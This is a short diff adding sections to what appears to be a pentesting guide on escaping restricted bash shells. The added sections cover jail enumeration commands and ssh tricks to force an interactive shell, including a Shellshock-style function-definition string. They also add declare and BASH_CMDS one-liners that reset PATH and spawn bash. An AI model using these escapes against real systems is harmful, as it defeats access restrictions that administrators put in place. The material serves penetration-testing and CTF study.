@@ -59,6 +59,18 @@ system("/bin/bash");
 
 ## Bash Jails
 
+### Enumeration
+
+Get info about the jail:
+
+```bash
+echo $SHELL
+echo $PATH
+env
+export
+pwd
+```
+
 ### Modify PATH
 
 Check if you can modify the PATH env variable
@@ -91,6 +103,16 @@ If you are accessing via ssh you can use this trick to execute a bash shell:
 
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
+ssh user@<IP> -t "bash --noprofile -i"
+ssh user@<IP> -t "() { :; }; sh -i "
+```
+
+### Declare
+
+```bash
+declare -n PATH; export PATH=/bin;bash -i
+ 
+BASH_CMDS[shell]=/bin/bash;shell -i
 ```
 
 ### Wget
